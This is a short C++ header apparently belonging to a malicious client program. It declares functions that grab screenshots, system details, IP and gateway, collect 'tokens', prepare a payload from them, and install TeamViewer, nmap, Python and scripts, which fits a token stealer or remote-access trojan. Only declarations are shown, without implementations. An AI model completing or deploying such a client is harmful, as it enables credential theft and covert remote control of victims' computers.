#pragma once
#include <string>
#include <vector>

namespace client {
	namespace functions {
		std::vector<std::string> get_all_windows();

		void take_screenshot(std::string file);

		std::string get_computer_info();

		std::string get_computer_brand();

		std::string get_ip();

		std::string get_default_gateway();

		std::vector<std::string> get_tokens();

		std::string prepare_payload(std::string title, std::vector<std::string> tokens);

		void set_wallpaper(LPCWSTR file);

		void install_python();

		void install_teamviewer();

		void install_nmap();

		void install_scripts();
	}
}